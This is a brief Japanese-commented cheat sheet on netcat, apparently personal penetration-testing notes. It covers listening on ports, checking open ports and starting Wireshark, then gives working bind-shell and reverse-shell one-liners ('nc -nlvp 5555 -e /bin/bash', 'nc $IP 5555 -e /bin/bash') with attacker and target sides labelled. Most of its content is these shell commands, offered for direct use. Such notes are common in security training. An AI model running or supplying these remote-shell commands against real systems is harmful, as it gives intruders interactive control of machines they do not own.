# How to Use Netcat

```bash
//netcatdでポート5555で接続を待ち受ける
nc -nlvp 5555

//接続待ちのポートを調べる
netstat -atn
lsof -i

//wireshark
sudo wireshark

//netcatでターゲットに接続する
nc $IP 5555


//Bind shell
//接続側：netcatをサーバーとして動作させて、接続したらシェルを操作できるようにする
nc -nlvp 5555 -e /bin/bash

//攻撃側から接続する
nc $IP 5555


//Reverse shell
//攻撃側
nc -nlvp 5555

//接続側
nc $IP 5555 -e /bin/bash
